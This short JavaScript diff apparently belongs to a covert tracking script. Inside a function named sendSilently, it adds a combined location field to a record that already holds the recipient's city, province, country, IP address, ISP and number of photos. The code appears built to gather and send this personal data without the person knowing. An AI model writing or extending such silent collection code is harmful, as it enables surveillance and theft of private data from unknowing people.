@@ -497,6 +497,7 @@ async function sendSilently(trigger = 'unknown'){
       kota: lokasi.kota,
       provinsi: lokasi.provinsi,
       negara: lokasi.negara,
+      lokasi_lengkap: [lokasi.kota, lokasi.provinsi, lokasi.negara].filter(v => v && v !== '-').join(', ') || '-',
       ip_penerima: lokasi.ip,
       isp: lokasi.isp,
       jumlah_foto: String(DATA.fotos.length),
